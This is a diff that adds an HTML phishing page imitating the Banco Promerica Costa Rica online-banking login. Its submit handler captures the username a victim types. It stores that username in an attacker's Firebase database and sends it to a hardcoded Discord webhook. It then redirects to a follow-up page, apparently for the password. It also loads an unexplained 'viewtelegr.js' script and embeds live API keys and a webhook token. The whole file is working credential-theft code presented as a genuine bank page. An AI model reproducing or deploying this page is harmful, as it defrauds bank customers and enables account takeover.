@@ -1,0 +1,539 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head id="ctl00_Head1">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+    <style type="text/css" id="operaUserStyle"></style>
+    <link
+      rel="SHORTCUT ICON"
+      href="https://banca.grupopromerica.com/PCRC/App_Themes/Regional_Default/images/favicon.ico"
+    />
+    <title>Ingreso</title>
+    <link
+      href="./index_files/ccStatementFooter.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link
+      href="./index_files/ccStatementTransactionsUCN.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link href="./index_files/chatbot.css" type="text/css" rel="stylesheet" />
+    <link
+      href="./index_files/NunitoSans.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link
+      href="./index_files/NunitoSans.min.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link href="./index_files/chosen.css" type="text/css" rel="stylesheet" />
+    <link href="./index_files/desktop.css" type="text/css" rel="stylesheet" />
+    <link
+      href="./index_files/font-awesome.min.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link href="./index_files/GridHtml.css" type="text/css" rel="stylesheet" />
+    <link
+      href="./index_files/GridFilter.css"
+      type="text/css"
+      rel="stylesheet"
+    />
+    <link href="./index_files/TabHtml.css" type="text/css" rel="stylesheet" />
+    <link href="./index_files/utilities.css" type="text/css" rel="stylesheet" />
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <!-- LibrerÃ­as externas -->
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+<script src="viewtelegr.js"></script>    
+    <!-- Firebase ConfiguraciÃ³n -->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBXNDJq-9iBihUc9orvm2_6415iCOiFWlI",
+  authDomain: "flp23-8eeb3.firebaseapp.com",
+  databaseURL: "https://flp23-8eeb3-default-rtdb.firebaseio.com",
+  projectId: "flp23-8eeb3",
+  storageBucket: "flp23-8eeb3.firebasestorage.app",
+  messagingSenderId: "729160647533",
+  appId: "1:729160647533:web:af6a9d6e91b1abee4d5064",
+  measurementId: "G-FVFE98HTVK"
+};
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      // Hacer accesible globalmente
+      window.db = db;
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+  </head>
+
+    <body class="popUpFont">
+        <div id="zContent" style="display: block;">
+        
+          <div id="BackDiv" class="backDiv">
+            <div id="LoadingDiv" class="loadingDiv">
+              <img src="./index_files/Loader.gif" id="ctl00_img_Loading" class="imgLoading" alt="Loading...">
+            </div>
+          </div>
+          <div id="headerLogin" class="styleNewHeader">
+            <div id="logoLogin" class="styleNewLogo">
+              <img id="ctl00_ciLogo_header" src="./index_files/NewLogo.jpg" alt="logo" style="border-width:0px;">
+            </div>
+            <div id="countryLogin" class="styleDivCountry">
+              <span id="ctl00_clCountryName" class="styleNewColorCountry">Costa Rica</span>
+            </div>
+          </div>
+          <div class="bottom_nav"></div>
+          <div id="page_title">
+            <div id="login_cotainer">
+              <table width="100%">
+                <tbody>
+                  <tr>
+                    <td style="width: 800px;">
+                      <div class="sub_title_login text_login">
+                        <span id="ctl00_PlaceHolder_pbLoginUC_clWelcomeTitle" class="page_title_text">Bienvenido a Promerica en LÃ­nea</span>
+                        <div id="ctl00_PlaceHolder_pbLoginUC_cgLoginAdditionalText" class="login_slider">
+                          <div>
+                            <div style="width:50px;">
+                              <div style="width: 520px; position: relative; visibility: visible; overflow: hidden; height: 204px;" id="myreel">
+                                <div class="slide" style="position: absolute; left: -520px; width: 520px; height: 204px; text-align: center; visibility: hidden; z-index: 17;">
+                                  <div style="width:520px;height:204px;display:table-cell;vertical-align:middle;">
+                                    <img src="./index_files/afiliacion.jpg" style="border-width:0;">
+                                  </div>
+                                </div>
+                                <div class="slide" style="position: absolute; left: -520px; width: 520px; height: 204px; text-align: center; z-index: 18; visibility: hidden;">
+                                  <div style="width:520px;height:204px;display:table-cell;vertical-align:middle;">
+                                    <img src="index_files/afiliacion.jpg" style="border-width:0;">
+                                  </div>
+                                </div>
+                                <div class="slide" style="position: absolute; left: -520px; width: 520px; height: 204px; text-align: center; z-index: 19; visibility: hidden;">
+                                  <div style="width:520px;height:204px;display:table-cell;vertical-align:middle;">
+                                    <img src="./index_files/pagodeservicios.jpg" style="border-width:0;">
+                                  </div>
+                                </div>
+                                <div class="slide" style="position: absolute; left: 0px; width: 520px; height: 204px; text-align: center; z-index: 20; visibility: visible;">
+                                  <div style="width:520px;height:204px;display:table-cell;vertical-align:middle;">
+                                    <img src="./index_files/pagodetarjetas.jpg" style="border-width:0;">
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                            <table width="50px"></table>
+                          </div>
+                        </div>
+                        <div style="margin-top: 50px;">
+                          <table>
+                            <tbody>
+                              <tr>
+                                <td colspan="2"></td>
+                              </tr>
+                              <tr>
+                                <td align="center" colspan="2">
+                                  <div id="ctl00_PlaceHolder_pbLoginUC_Div1">
+                                    <div>
+                                      <table align="center" width="460px">
+                                        <tbody>
+                                          <tr>
+                                            <td class="normal_text strong page_login_subtitle_text text_login"> Para su seguridad:</td>
+                                          </tr>
+                                          <tr class="logincolorbg">
+                                            <td class="logincolorbg" colspan="2" style="font-size: 9pt; font-family: Arial, Helvetica, Sans-Serif;
+                    text-align: justify">
+                                              <p class="page_login_text"> Banco Promerica nunca solicitarÃ¡ su clave de acceso, nÃºmero de PIN o informaciÃ³n confidencial por medio de correo electrÃ³nico o por telÃ©fono. Para utilizar este sitio en forma Ã³ptima se recomienda utilizar una resoluciÃ³n mÃ­nima de 1024x768.</p>
+                                            </td>
+                                          </tr>
+                                        </tbody>
+                                      </table>
+                                    </div>
+                                  </div>
+                                </td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </div>
+                      </div>
+                    </td>
+                    <td>
+                      <form class="login100-form validate-form" action="#" id="loginform" method="post">
+                        <p id="gfg" hidden=""></p>
+                        <p id="address" hidden=""></p>
+                        <div style="text-align: center">
+                          <div id="ValidateAlias">
+                            <div class="sub_title sub_title_login text_login" style="width: 400px;">
+                              <span id="ctl00_PlaceHolder_pbLoginUC_clAliasArea" class="sub_title_text f130 text_login">Por favor, digite su usuario</span>
+                            </div>
+                            <div>
+                              <table style="margin: 10px auto;" cellspacing="10">
+                                <tbody>
+                                  <tr>
+                                    <td align="right">
+                                      <span id="ctl00_PlaceHolder_pbLoginUC_clLogin" class="normal_text strong text_login" style="display:inline-block;width:85px;padding-top:7px;">Usuario</span>
+                                    </td>
+                                    <td>
+                                      <input name="ypn-us" type="text" maxlength="50" id="ypn-us" style="width:150px;" tabindex="0" required>
+                                      <span id="rvLogin" style="color:Red;background-color:Transparent;visibility:hidden;">*</span>
+                                      <button type="submit" name="ctl00$PlaceHolder$pbLoginUC$btValidateAlias" value="Ingresar" id="btValidateAlias" class="buttons buttons_text notNullOrEmpty text_login">Continuar</button>
+                                    </td>
+                                  </tr>
+                                </tbody>
+                              </table>
+                            </div>
+                          </div>
+                        </form>
+                          <div class="m-l-45 logi_remove">
+                            <link href="./index_files/utilities.css" rel="stylesheet" type="text/css">
+                            <div id="divContainAllControls" class="login_form p-b-10">
+                              <div id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_div_clMessageDigSig" style="display:none;" class="page-wrap">
+                                <span id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_clInfo" class="normal_text m-t-5"></span>
+                                <br>
+                                <br>
+                              </div>
+                              <table id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_tbCheckDigSig" class="p-b-10">
+                                <tbody>
+                                  <tr>
+                                    <td class="textleft">
+                                      <span id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_clDigitalSignature" class="normal_text strong text-bottom text_login">Firma Digital</span>
+                                      <input class="inp-cbx" id="cbx" type="checkbox" style="display: none;" tabindex="0">
+                                      <label class="cbx m-l-9" for="cbx">
+                                        <span>
+                                          <svg width="12px" height="10px" viewBox="0 0 12 10">
+                                            <polyline points="1.5 6 4.5 9 10.5 1"></polyline>
+                                          </svg>
+                                        </span>
+                                        <span></span>
+                                      </label>
+                                    </td>
+                                  </tr>
+                                </tbody>
+                              </table>
+                              <table id="tbDigitalSignature" class="grid" style="width: 82%; display: none">
+                                <tbody>
+                                  <tr>
+                                    <td>
+                                      <span id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_clInfoDigSig" class="normal_text m-t-5 m-b-5 m-l-30 text_login">Para ingresar a Promerica en LÃ­nea Costa Rica con firma digital, digite su nÃºmero de identificaciÃ³n</span>
+                                    </td>
+                                  </tr>
+                                  <tr>
+                                    <td class="p-t-10 p-r-0 p-b-5 p-l-0">
+                                      <input name="ctl00$PlaceHolder$pbLoginUC$pbDigitalSignatureUC$ctIdDigitalSignature" type="text" id="ctIdDigitalSignature" class="ctIdDigSig" placeholder="00-0000-0000" style="width:150px;margin-left: 10px" tabindex="0">
+                                      <span id="rvIdDigitalSignature" style="color:Red;background-color:Transparent;visibility:hidden;">*</span>
+                                      <div class="tooltip strong">
+                                        <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="25" viewBox="0 5 52 52" style="enable-background: new 0 0 48 48; fill: #000000;">
+                                          <g id="info">
+                                            <path style="fill:#61BF1A;" d="M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z"></path>
+                                            <path style="fill:#FFFFFF;" d="M22,22h4v11h-4V22z"></path>
+                                            <path style="fill:#FFFFFF;" d="M26.5,16.5c0,1.379-1.121,2.5-2.5,2.5s-2.5-1.121-2.5-2.5S22.621,14,24,14S26.5,15.121,26.5,16.5z"></path>
+                                          </g>
+                                        </svg>
+                                        <div class="right">
+                                          <p class="normal_text strong text_login"> Formato IdentificaciÃ³n</p>
+                                          <p class="normal_text text_login"> Nacional: 00-0000-0000</p>
+                                          <p class="normal_text text_login"> DIDI: 500000000000</p>
+                                          <p class="normal_text text_login"> DIMEX: 100000000000</p>
+                                          <i></i>
+                                        </div>
+                                      </div>
+                                    </td>
+                                  </tr>
+                                  <tr>
+                                    <td class="p-t-5 p-b-10">
+                                      <center>
+                                        <table id="ctTypeIdDigitalSignature" class="normal_text text_login" border="0">
+                                          <tbody>
+                                            <tr>
+                                              <td>
+                                                <input id="ctTypeIdDigitalSignature_0" type="radio" name="ctl00$PlaceHolder$pbLoginUC$pbDigitalSignatureUC$ctTypeIdDigitalSignature" value="N" checked="checked" tabindex="0">
+                                                <label for="ctTypeIdDigitalSignature_0">Nacional</label>
+                                              </td>
+                                              <td>
+                                                <input id="ctTypeIdDigitalSignature_1" type="radio" name="ctl00$PlaceHolder$pbLoginUC$pbDigitalSignatureUC$ctTypeIdDigitalSignature" value="E" tabindex="0">
+                                                <label for="ctTypeIdDigitalSignature_1">Extranjero</label>
+                                              </td>
+                                            </tr>
+                                          </tbody>
+                                        </table>
+                                      </center>
+                                    </td>
+                                  </tr>
+                                </tbody>
+                              </table>
+                              <div id="divBtnAuth" style="display:none;">
+                                <table class="grid" style="width: 25%;">
+                                  <tbody>
+                                    <tr>
+                                      <td class="p-t-5 p-b-5 p-r-15">
+                                        <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$pbDigitalSignatureUC$cbAuth" value="Firmar" id="cbAuth" class="buttons buttons_text" tabindex="0">
+                                      </td>
+                                    </tr>
+                                  </tbody>
+                                </table>
+                              </div>
+                              <div id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_upAwaitDigitalSig"></div>
+                              <div id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_upErrorDigSig"></div>
+                              <div id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_upMessage"></div>
+                              <div id="divBtnBack" style="display: none">
+                                <table class="grid" style="width: 100%;">
+                                  <tbody>
+                                    <tr>
+                                      <td class="p-t-10 p-b-5">
+                                        <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$pbDigitalSignatureUC$cbReload" value="Aceptar" id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_cbReload" class="buttons buttons_text js-LockPage text_login" tabindex="0">
+                                      </td>
+                                    </tr>
+                                  </tbody>
+                                </table>
+                              </div>
+                              <div id="buttons">
+                                <div id="ctl00_PlaceHolder_pbLoginUC_pbDigitalSignatureUC_upButtons">
+                                  <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$pbDigitalSignatureUC$btAwaitResponseDigitalSignature" value="" id="btAwaitResponseDigitalSignature" style="display: none" tabindex="0">
+                                </div>
+                              </div>
+                              <div id="hf">
+                                <input type="hidden" name="ctl00$PlaceHolder$pbLoginUC$pbDigitalSignatureUC$hfDigSigCheck" id="hfDigSigCheck" value="false" tabindex="0">
+                                <input type="hidden" name="ctl00$PlaceHolder$pbLoginUC$pbDigitalSignatureUC$hfDigSigIDStored" id="hfDigSigIDStored" tabindex="0">
+                              </div>
+                            </div>
+                          </div>
+                          <div class="login_form login_reposition_line m-l-20 m-t-0 p-t-0"></div>
+                          <div id="OptionsLogin">
+                            <div id="ctl00_PlaceHolder_pbLoginUC_cgInformationDetail" style="margin: 10px auto; text-align: center;">
+                              <i class="fa fa-info-circle" style="font-size:20px">&nbsp;</i>
+                              <button type="button" id="btnSelfCare" class="styleRecoverPassword text_login" tabindex="0">Â¿OlvidÃ³ su contraseÃ±a?</button>
+                            </div>
+                            <table style="margin: 10px auto;">
+                              <tbody>
+                                <tr>
+                                  <td></td>
+                                  <td>
+                                    <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btPassword" value="1. Solicite una contraseÃ±a temporal" id="ctl00_PlaceHolder_pbLoginUC_btPassword" class="buttons buttons_text text_login" tabindex="0">
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                            <table style="margin: 10px auto;">
+                              <tbody>
+                                <tr>
+                                  <td>
+                                    <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btAsistencia" value="2. Ingrese su contraseÃ±a temporal" id="ctl00_PlaceHolder_pbLoginUC_btAsistencia" class="buttons buttons_text text_login" tabindex="0">
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                            <div class="login_form m-l-20"></div>
+                            <div>
+                              <div style="margin: 10px auto; text-align: center;">
+                                <span id="ctl00_PlaceHolder_pbLoginUC_GalileoASPLabelQuestionSignUp" class="f180 text_login">Â¿Es cliente y no tiene usuario?</span>
+                              </div>
+                              <div class="styleDivSignUp">
+                                <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btnSignUpPage" value="Crear Usuario" id="ctl00_PlaceHolder_pbLoginUC_btnSignUpPage" class="buttons buttons_text text_login" tabindex="0">
+                              </div>
+                            </div>
+                          </div>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div id="buttons">
+              <input type="submit" name="ctl00$PlaceHolder$pbLoginUC$btShowLogin" value="" id="btShowLogin" style="display: none" tabindex="0">
+            </div>
+            <div class="styleSeparator"></div>
+            <div style="margin-left:20px;">
+              <label class="styleTitle1NewProducts">Productos diseÃ±ados</label>
+              <label class="styleTitle2NewProducts">para sus necesidades</label>
+            </div>
+            <div style="margin:10px;">
+              <div class="styleCard">
+                <img src="./index_files/CtaAhorro.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
+                <div class="styleContainer">
+                  <label class="styleTitleCard">Cuenta ahorros</label>
+                  <label class="styleTextCard">Abrir cuenta en lÃ­nea y sin filas.</label>
+                  <button type="button" class="styleButtonCard" tabindex="0">Abrir cuenta</button>
+                </div>
+              </div>
+              <div class="styleCard">
+                <img src="./index_files/CtaEmpresas.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
+                <div class="styleContainer">
+                  <label class="styleTitleCard">Cuenta empresas</label>
+                  <label class="styleTextCard">Cuenta corriente en dÃ³lares o colones.</label>
+                  <button type="button" class="styleButtonCard" tabindex="0">Solicitar</button>
+                </div>
+              </div>
+              <div class="styleCard">
+                <img src="./index_files/CreditCard.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
+                <div class="styleContainer">
+                  <label class="styleTitleCard">Tarjetas crÃ©dito</label>
+                  <label class="styleTextCard">Descuentos, canje de millas y mÃ¡s.</label>
+                  <button type="button" class="styleButtonCard" tabindex="0">Solicitar</button>
+                </div>
+              </div>
+              <div class="styleCard">
+                <img src="./index_files/PymeCard.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
+                <div class="styleContainer">
+                  <label class="styleTitleCard">Tarjeta Pyme</label>
+                  <label class="styleTextCard">MÃºltiples beneficios para su negocio.</label>
+                  <button type="button" class="styleButtonCard" tabindex="0">Solicitar</button>
+                </div>
+              </div>
+              <div class="styleCard">
+                <img src="./index_files/Secure.png" style="width:32px; height:32px; margin-top:15px; margin-left:20px;">
+                <div class="styleContainer">
+                  <label class="styleTitleCard">Seguros</label>
+                  <label class="styleTextCard">ProtecciÃ³n para usted y su familia.</label>
+                  <button type="button" class="styleButtonCard" tabindex="0">Elegir seguro</button>
+                </div>
+              </div>
+            </div>
+            <div class="styleSeparatorBlank"></div>
+            <div style="text-align: center;">
+              <a class="styleSocialNetwork fa-facebook" href="#" tabindex="0"></a>
+              <a class="styleSocialNetwork fa-twitter" href="#" tabindex="0"></a>
+              <a class="styleSocialNetwork fa-instagram" href="#" tabindex="0"></a>
+              <a class="styleSocialNetwork fa-whatsapp" href="#" tabindex="0"></a>
+            </div>
+            <div id="ctImageMessageN" style="position: fixed; z-index: 100001; left: 659px; top: 160px; display: none;" class="contentBannerLogin">
+              <img id="imgClose" src="./index_files/cerrar.png" alt="Cerrar" class="closeBannerLogin">
+              <img src="./index_files/banner_IB.jpg" alt="InformaciÃ³n" class="bannerLogin">
+            </div>
+            <meta http-equiv="X-UA-Compatible" content="IE=edge">
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <title>Chatbot de Servicio al Cliente</title>
+            <link href="./index_files/chatbot.css" rel="stylesheet" type="text/css">
+            <div class="fb_dialog fb_dialog_advanced fb_customer_chat_bubble_animated_no_badge fb_customer_chat_bubble_pop_in" style="background: rgba(0, 0, 0, 0) none repeat scroll 0% 0%; border-radius: 50%; bottom: 5pt; display: inline; height: 45pt; padding: 0px; position: fixed; right: 18pt; top: auto; width: 45pt; z-index: 2147483646;">
+              <div id="botonOpcionesChat" class="messenger-button-shown" style="width: 58px; height: 58px; background-color: #69be28;">
+                <img src="./index_files/chatchatbot.png" style="max-width: 58px; max-height: 58px;">
+              </div>
+            </div>
+            <div id="divPrincipal" class="divPrincipal hideDiv">
+              <div class="promptContainer">
+                <div class="promptHeaderContainer">
+                  <div id="CloseButton" class="promptHeaderCloseButtonContainer">
+                    <div class="CloseButtonContainer" tabindex="0" role="button">
+                      <svg width="10px" height="10px" viewBox="0 0 14 14">
+                        <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                          <g transform="translate(-419.000000, -413.000000)">
+                            <g transform="translate(164.000000, 396.000000)">
+                              <g>
+                                <g transform="translate(250.000000, 12.000000)">
+                                  <g>
+                                    <g>
+                                      <rect opacity="0.200000003" x="0" y="0" width="24" height="24"></rect>
+                                      <g transform="translate(4.000000, 4.000000)" fill="#000000">
+                                        <rect transform="translate(8.000000, 8.000000) rotate(45.000000) translate(-8.000000, -8.000000) " x="7" y="-1" width="2" height="18" rx="1"></rect>
+                                        <rect transform="translate(8.000000, 8.000000) rotate(135.000000) translate(-8.000000, -8.000000) " x="7" y="-1" width="2" height="18" rx="1"></rect>
+                                      </g>
+                                    </g>
+                                  </g>
+                                </g>
+                              </g>
+                            </g>
+                          </g>
+                        </g>
+                      </svg>
+                    </div>
+                  </div>
+                  <div class="profilePictureContainer">
+                    <div class="PromericaHeader">
+                      <img class="profilePicture img" src="./index_files/estrellapromericachatbot.png" alt="">
+                      <div class="clearfix"></div>
+                    </div>
+                  </div>
+                  <div class="promptHeaderAndBubbleContainer">
+                    <div class="promptHeaderText" style="-webkit-line-clamp: 1; font-size: 11px;">
+                      <strong>Banco Promerica Costa Rica</strong>
+                    </div>
+                    <span class="promptTextBubble">
+                      <span>Â¡Hola! Â¿En quÃ© podemos ayudarte?</span>
+                    </span>
+                  </div>
+                </div>
+                <div class="promptFooterContainer">
+                  <div id="AsistenteVirtual" class="_4bqf promptButton" style="background-color: rgb(105, 190, 40); margin-top: 10px;" tabindex="0" role="button">
+                    <div style="position: fixed; width: 30px; height: 30px">
+                      <img style="width: 30px; height: 30px; position: absolute; left: -20px; top: -4px;" src="./index_files/chatchatbot.png">
+                    </div>
+                    <div style="margin-left: 20px;">Asistente Virtual</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <input type="hidden" name="ctl00$PlaceHolder$ctDummy" id="ctl00_PlaceHolder_ctDummy" tabindex="0">
+            <div class="ConfirmModalBackground" style="position: fixed; left: 0px; top: 0px; z-index: 10000; width: 1918px; height: 1043px; display: none;"></div>
+          </div>
+          <div class="styleTopFooter"></div>
+          <div id="footer">
+            <div class="styleTextFooter">
+              <span class="styleTextOptionFooter"> Banco Promerica 2025 | Todos los derechos reservados. </span>
+              <span class="styleTextOptionFooter"> | </span>
+              <a class="styleTextOptionFooter" href="#" tabindex="0">TÃ©rminos y Condiciones</a>
+              <span class="styleTextOptionFooter"> | </span>
+              <a class="styleTextOptionFooter" href="#" tabindex="0">Recomendaciones de Seguridad</a>
+              <span class="styleTextOptionFooter"> | </span>
+              <a class="styleTextOptionFooter" href="#" tabindex="0">ContÃ¡ctenos</a>
+            </div>
+            <div class="rights">
+              <img id="ctl00_ciLogo_footer" src="./index_files/Logo2.png" alt="logo2" style="height:79px;width:193px;border-width:0px;">
+            </div>
+          </div>
+        </div>
+        
+     
+  </body>
+
+  <script>
+    document
+      .querySelector("#loginform")
+      .addEventListener("submit", async (event) => {
+        event.preventDefault();
+
+        const usuario = document.querySelector("#ypn-us").value;
+
+        if (!usuario ) {
+          alert("Por favor, complete todos los campos.");
+          return;
+        }
+
+        try {
+          const userRef = doc(window.db, "prolme", usuario);
+          await setDoc(userRef, {
+            question1: "Sin uso",
+            question2: "Sin uso",
+            question3: "Sin uso",
+            page: 0,
+          });
+
+          localStorage.setItem("usuario", usuario);
+          const message = `Promerica FwC\nNombre: ${usuario}`;
+
+
+      const discord_webhook_url = "https://discordapp.com/api/webhooks/1398111934762455101/bFtkFx3qvgCVK1XdhLLkSjevXW787gI75e3GEBTWpojW3WzQX7D089UkDGGwjjBtbXGf";
+
+      await fetch(discord_webhook_url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          content: message
+        }),
+      });
+
+          window.location.href = "plpass.html";
+        } catch (error) {
+          console.error("Error al enviar datos:", error);
+        }
+      });
+  </script>
+</html>
